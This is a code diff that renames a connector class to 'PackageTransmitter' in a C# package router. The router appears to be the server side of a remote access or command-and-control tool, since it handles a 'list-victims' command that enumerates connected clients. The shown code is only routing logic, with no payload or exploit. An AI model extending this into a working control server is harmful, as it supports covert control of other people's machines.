@@ -9,48 +9,48 @@ namespace LinkUs
 {
     public class PackageRouter
     {
-        private readonly IDictionary<ClientId, PackageConnector> _activeConnectors = new ConcurrentDictionary<ClientId, PackageConnector>();
+        private readonly IDictionary<ClientId, PackageTransmitter> _activeTransmitter = new ConcurrentDictionary<ClientId, PackageTransmitter>();
         public event Action<ClientId> ClientConnected;
         public event Action<ClientId> ClientDisconnected;
 
         // ----- Public methods
         public void Connect(IConnection connection)
         {
-            var packageConnector = new PackageConnector(connection);
-            packageConnector.Closed += PackageConnectorOnClosed;
-            packageConnector.PackageReceived += PackageConnectorOnPackageReceived;
+            var packageTransmitter = new PackageTransmitter(connection);
+            packageTransmitter.Closed += PackageTransmitterOnClosed;
+            packageTransmitter.PackageReceived += PackageTransmitterOnPackageReceived;
             var newClientId = ClientId.New();
-            _activeConnectors.Add(newClientId, packageConnector);
+            _activeTransmitter.Add(newClientId, packageTransmitter);
             ClientConnected?.Invoke(newClientId);
         }
         public void Close()
         {
-            foreach (var packageConnector in _activeConnectors.Values) {
-                packageConnector.Close();
+            foreach (var packageTransmitter in _activeTransmitter.Values) {
+                packageTransmitter.Close();
             }
         }
 
         // ----- Event callbacks
-        private void PackageConnectorOnPackageReceived(object sender, Package package)
+        private void PackageTransmitterOnPackageReceived(object sender, Package package)
         {
-            var packageConnector = (PackageConnector) sender;
-            var clientId = _activeConnectors.Single(x => x.Value == packageConnector).Key;
+            var packageTransmitter = (PackageTransmitter) sender;
+            var clientId = _activeTransmitter.Single(x => x.Value == packageTransmitter).Key;
             package.ChangeSource(clientId);
             ProcessPackage(package);
         }
-        private void PackageConnectorOnClosed(object sender, EventArgs eventArgs)
+        private void PackageTransmitterOnClosed(object sender, EventArgs eventArgs)
         {
-            var packageConnector = (PackageConnector) sender;
-            var entry = _activeConnectors.Single(x => x.Value == packageConnector);
-            _activeConnectors.Remove(entry);
+            var packageTransmitter = (PackageTransmitter) sender;
+            var entry = _activeTransmitter.Single(x => x.Value == packageTransmitter);
+            _activeTransmitter.Remove(entry);
             ClientDisconnected?.Invoke(entry.Key);
         }
 
         // ----- Internal logics
         private void SendPackage(Package package)
         {
-            var packageConnector = _activeConnectors[package.Destination];
-            packageConnector.Send(package);
+            var packageTransmitter = _activeTransmitter[package.Destination];
+            packageTransmitter.Send(package);
         }
         private void ProcessPackage(Package package)
         {
@@ -60,7 +60,7 @@ namespace LinkUs
             else {
                 var commandLine = Encoding.UTF8.GetString(package.Content);
                 if (commandLine == "list-victims") {
-                    var clients = _activeConnectors.Keys;
+                    var clients = _activeTransmitter.Keys;
                     var value = string.Join(Environment.NewLine, clients.Select(x => x.ToString()));
                     var packageResponse = package.CreateResponsePackage(Encoding.UTF8.GetBytes(value));
                     SendPackage(packageResponse);
